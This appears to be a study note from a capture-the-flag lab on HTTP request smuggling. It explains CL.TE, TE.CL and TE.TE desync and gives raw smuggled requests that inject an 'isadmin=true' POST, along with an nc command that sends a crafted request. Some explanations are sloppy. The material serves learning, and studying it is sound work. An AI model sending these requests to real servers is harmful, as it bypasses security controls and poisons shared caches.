# Request Smuggling
Consider a simple front-end that uses the `Content-Length` header to determine the end of request, and a back-end server that uses the `Transfer-Encoding` header.  

We can craft a request that satisfies the boundry to the front-end sever

## Benefits
1. Evade security mechanisms like WAFs.
2. Poison web caches 3. Chained to exploit other vulnerabilities
4. Hard to detect

## Definitions
| Term | Definition |
| ---- | ---------- |
| Front-end Server | Reverse proxy or load balancer the forwards the request to backend. |
| Back-end server | Processes requests, database, serves to frontend |
| Databases | Store user data |
| Microservices | Small independent services that communicate over REST / HTTP / gRPC |
| Load Balancer | Dsitribute incoming network traffic to other service to prevent overloading | 
| Reverse Proxies | Sits before web servers and forwards client requests to the appropriate server |
| Resource Cache | Doesn't change frequently. (css,js) |
| DB Query Cache | Caches results of frequently used queries |
| Full Page Cache | Entire page & resources cached |
| API Cache | Common responses | 

## Headers

1. Content-Length
Informs the receiver of the request / response size in bytes. 
```sh
POST /submit HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

q=smuggledData
```

2. Transfer-Encoding
Specify the form of encoding. Common value is `chunked` indicating that the body is divided each preceeded by it's size in hex.  In the below example `b` indicates `11` and `0` indicates the end.
```sh
POST /submit HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggledData
0
```

## Exploiting CL.TE 
Craft a request that includes the `Content-Length` and `Transfer-Encoding` headers in that order.
```sh
POST /search HTTP/1.1
Host: example.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /update HTTP/1.1
Host: example.com
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

isadmin=true
```

### How it works
- Front end server sees `Content-Length` of 130 bytes and believes the request ends after `isadmin=true`.
- Back end sernver sees the `Transfer-Encoding: chunked` and iterprets `0` as the end of the chunk.
- Back end server then tries to send the remaing portion of the request `POST /update HTTP/1.1` as a separate request.

## Exploiting TE.CL
Craft a request that includes the `Transfer-Encoding` and `Content-Length` headers in that order.
```sh
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

78
POST /update HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

isadmin=true
0
```

### How it works
- Front-end server sees the `Tranfer-Encoding: chunked` and processes it.
- The `78` is hex for 120 bytes.
- Front-end considers everything up to the `0` as part of the first request.
- Back-end server use `Content-Length: 4` and only processes the first 4 bytes of the request.
- The remaining `POST /update` is then interpreted as a new request.

## Exploiting TE.TE
Exploit how front-end and back-end servers prioritize TE over CL. The aim is to make one server ignore the TE header and use CL instead.
```sh
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: chunked1


4e
POST /update HTTP/1.1
Host: example.com
Content-Length: 15


isadmin=true
0
```

### How it works
- Front-end receives two `Transfer-Encoding` headers. 
- The first is standard, second chunked
- Server might process based on chunked, instead of broken chunked1
- If the server processes only the first 4 bytes the remaining will be treated separately

## Sending Crafted Request
We won't be able to do this with curl, but nc is a good alternative.

raw.html
```sh
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 160
Transfer-Encoding: chunked


0


POST /contact.php HTTP/1.1
Host: httprequestsmuggling.thm
Content-Type: application/x-www-form-urlencoded
Content-Length: 500


username=test&query=test
```

Send request
```sh
nc $url 80 < raw.html
```
